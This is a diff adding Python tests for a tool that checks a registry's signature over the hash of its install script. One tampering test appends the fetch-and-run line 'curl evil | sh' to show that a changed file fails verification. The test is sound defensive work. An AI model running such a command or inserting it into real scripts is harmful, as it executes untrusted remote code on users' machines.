@@ -114,3 +114,44 @@ def test_the_live_example_verifies_against_the_registry_keys():
     r = vs.verify(os.path.join(ex, "xchk-scitt-aa2bfd5b1d9b.cose"), os.path.join(ex, "xchk-receipt-aa2bfd5b1d9b.json"),
                   os.path.join(ex, "in.xchk.io-xchk-keys.json"))
     assert r["ok"], failed(r)
+
+
+# A FILE'S STATEMENT (28 Nov 2026): the registry signs the hash of its install script so that what is run is what was
+# read. The fixture was signed by xchk-server's scittStatementService.installStatementFor with a throwaway key
+# (install.fixture-keys.json holds its public half; the private half was discarded).
+INSTALL_COSE = os.path.join(FX, "install.fixture.cose")
+INSTALL_SH = os.path.join(FX, "install.fixture.sh")
+INSTALL_KEYS = os.path.join(FX, "install.fixture-keys.json")
+
+
+def test_a_files_statement_verifies_against_the_file_that_was_signed():
+    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS, INSTALL_SH)
+    assert r["ok"], failed(r)
+    assert r["payloadLocation"] == "https://in.xchk.io/api/install"
+    assert r["preimageContentType"] == "text/x-shellscript"
+
+
+def test_a_changed_file_fails(tmp_path):
+    p = tmp_path / "changed.sh"
+    p.write_bytes(open(INSTALL_SH, "rb").read() + b"curl evil | sh\n")
+    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS, str(p))
+    assert not r["ok"] and "payload equals sha256 of the file's bytes" in failed(r)
+
+
+def test_a_files_statement_is_not_a_records_and_a_records_is_not_a_files():
+    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS)            # no --file: judged as a record's statement
+    assert not r["ok"] and "sub names the same record as the payload" in failed(r)
+    r = vs.verify(COSE, None, KEYS, INSTALL_SH)                 # a record's statement offered for a file
+    assert not r["ok"] and any("urn:xchk:install:" in c for c in failed(r))
+
+
+def test_a_files_statement_needs_the_registrys_key_and_takes_no_bundle():
+    r = vs.verify(INSTALL_COSE, None, None, INSTALL_SH)
+    assert not r["ok"] and any("a key with this keyId is available" in c for c in failed(r)), "no key: closed"
+    r = vs.verify(INSTALL_COSE, BUNDLE, INSTALL_KEYS, INSTALL_SH)
+    assert not r["ok"] and "a file's statement is checked against the file, not a receipt bundle" in failed(r)
+
+
+def test_a_missing_file_fails(tmp_path):
+    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS, str(tmp_path / "nothing-here.sh"))
+    assert not r["ok"] and any(c.startswith("the file reads") for c in failed(r))
